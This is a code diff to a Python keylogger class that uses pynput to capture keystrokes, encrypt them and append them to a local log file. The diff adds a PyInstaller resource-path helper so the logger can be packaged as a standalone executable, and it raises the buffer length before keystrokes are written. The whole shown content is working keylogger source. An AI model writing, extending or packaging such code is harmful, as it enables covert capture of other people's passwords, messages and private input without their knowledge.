@@ -1,12 +1,13 @@
 import os
 
 from pynput.keyboard import Key, Listener
+
 from .crypt import Crypt
-from threading import Thread
+from .py_installer_config import resource_path
 
 
 class KeyLogger:
-    MAX_KEY_LENGTH = 10
+    MAX_KEY_LENGTH = 60
     keys = ""
     count = 0
     crypt = Crypt()
@@ -39,10 +40,10 @@ class KeyLogger:
             KeyLogger.count = 0
 
     def read_file(self):
-        if not os.path.exists("files/log.txt"):
-            open("files/log.txt", "x")
+        if not os.path.exists(resource_path("files/log.txt")):
+            open(resource_path("files/log.txt"), "x")
 
-        with open("files/log.txt", "rb") as enc_file:
+        with open(resource_path("files/log.txt"), "rb") as enc_file:
             encrypted_log_byte = enc_file.read()
 
         if encrypted_log_byte:
@@ -53,7 +54,7 @@ class KeyLogger:
     def write_file(self):
         final_log = self.read_file() + KeyLogger.keys
 
-        with open("files/log.txt", "wb") as f:
+        with open(resource_path("files/log.txt"), "wb") as f:
             f.write(KeyLogger.crypt.encrypt(str.encode(final_log)))
 
     def on_release(self, key):
